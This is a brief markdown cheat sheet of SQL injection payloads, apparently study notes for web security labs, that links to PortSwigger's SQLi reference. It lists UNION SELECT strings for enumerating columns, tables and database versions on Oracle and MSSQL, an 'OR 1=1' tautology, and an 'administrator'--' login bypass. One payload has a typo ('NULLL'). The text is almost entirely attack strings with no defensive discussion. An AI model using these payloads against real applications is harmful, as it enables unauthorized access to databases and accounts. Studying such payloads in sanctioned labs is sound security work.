## SQLi Cheatsheet
https://portswigger.net/web-security/sql-injection/cheat-sheet

## Column Enumeration
'+UNION+SELECT+NULL,NULLL--

## Table Enumeration
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- (non oracle)


## Version Enumeration
'+UNION+SELECT+BANNER,+NULL+FROM+v$version-- (Oracle)
'+UNION+SELECT+@@version,+NULL# (Windows & MSSql)

## General Payloads
```
'+OR+1=1--

```

## Auth Bypass
```
administrator'--
